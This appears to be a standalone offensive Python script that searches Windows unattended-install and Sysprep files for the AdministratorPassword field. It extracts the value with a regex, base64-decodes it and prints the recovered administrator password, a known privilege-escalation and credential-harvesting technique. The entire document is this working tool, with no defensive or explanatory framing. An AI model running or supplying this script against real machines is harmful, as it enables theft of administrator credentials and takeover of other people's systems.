#!/usr/bin/env python3

import os
import re
import base64

SEARCH_PATHS = [
    r"C:\Windows\Panther\Unattend.xml",
    r"C:\Windows\Panther\Unattend\Unattend.xml",
    r"C:\Windows\Panther\Unattend\Autounattend.xml",
    r"C:\Windows\System32\Sysprep\sysprep.inf",
    r"C:\Windows\System32\Sysprep\Sysprep.xml",
    r"C:\Unattend.xml",
    r"C:\Autounattend.xml",
]


def decode_password(value):
    value = value.strip()

    try:
        decoded = base64.b64decode(value).decode("utf-8").rstrip("\x00")
        if decoded:
            return decoded
    except Exception:
        pass

    return value


def extract_password(path):
    try:
        with open(path, "r", encoding="utf-8", errors="ignore") as f:
            data = f.read()

        pattern = re.compile(
            r"<AdministratorPassword>.*?<Value>(.*?)</Value>",
            re.DOTALL | re.IGNORECASE,
        )

        match = pattern.search(data)

        if match:
            password = decode_password(match.group(1))
            print(f"[+] Password found in {path}")
            print(f"[+] Administrator Password: {password}")
            return True

    except Exception:
        pass

    return False


def main():
    found = False

    for file in SEARCH_PATHS:
        if os.path.exists(file):
            if extract_password(file):
                found = True

    if not found:
        print("[-] No unattended password found.")


if __name__ == "__main__":
    main()
